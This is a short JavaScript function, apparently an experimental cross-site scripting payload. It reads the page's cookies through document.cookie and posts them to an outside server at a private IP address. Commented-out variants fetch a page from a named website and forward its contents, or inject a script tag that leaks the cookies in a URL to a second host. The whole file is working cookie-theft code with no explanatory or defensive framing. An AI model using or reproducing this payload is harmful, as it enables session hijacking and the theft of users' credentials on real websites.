function test_post() {
    var cookie_test = document.cookie

    //var test_var = $.get('http://q.maiziedu.com/common/setting/', async=true);
    $.post('http://192.168.1.109:8002/service/ticket/', cookie_test);
    //while (1){
    //    if (test_var.statusText == "OK"){
    //        console.log(test_var.responseText);
    //        $.post('http://192.168.1.110:7000/', test_var.responseText);
    //        break;
    //    }
    //
    //}
    // var hm = document.createElement("script");
    // hm.src = "//192.168.1.110:7000/?" + cookie_test;
    // var s = document.getElementsByTagName("script")[0];
    // s.parentNode.insertBefore(hm, s);
}